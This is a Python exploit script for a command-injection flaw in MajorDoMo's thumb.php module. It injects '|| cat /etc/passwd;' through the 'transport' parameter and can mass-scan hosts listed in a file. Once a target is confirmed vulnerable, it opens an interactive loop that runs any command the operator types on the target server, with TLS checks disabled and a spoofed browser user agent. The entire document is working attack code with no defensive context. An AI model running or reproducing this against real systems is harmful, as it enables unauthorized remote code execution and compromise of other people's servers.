import requests
import urllib3
import re
from urllib.parse import urljoin,quote
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7C+cat+%2Fetc%2Fpasswd%3b")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F",
    }
    try:
        response = requests.get(target, verify=False, headers=headers, timeout=15)
        if response.status_code == 200 and 'usr' in response.text and 'sbin' in response.text and 'spool' in response.text:
                print(f"\033[31mDiscovered:{url}: MajorDoMo_thumb_RCE!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F",
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                command = quote(quote(command))
                target = urljoin(url,"/modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7C{}%3B ".format(command))
                try:
                    response = requests.get(target, verify=False, headers=headers, timeout=15)
                    if response.status_code == 200 and 'cached' in response.text:
                        pattern = r"<pre>(.*?)</pre>"
                        matches = re.findall(pattern, response.text, re.DOTALL)
                        if matches:
                            content = matches[0]
                            print(content)
                    else:
                        print('执行失败!')
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")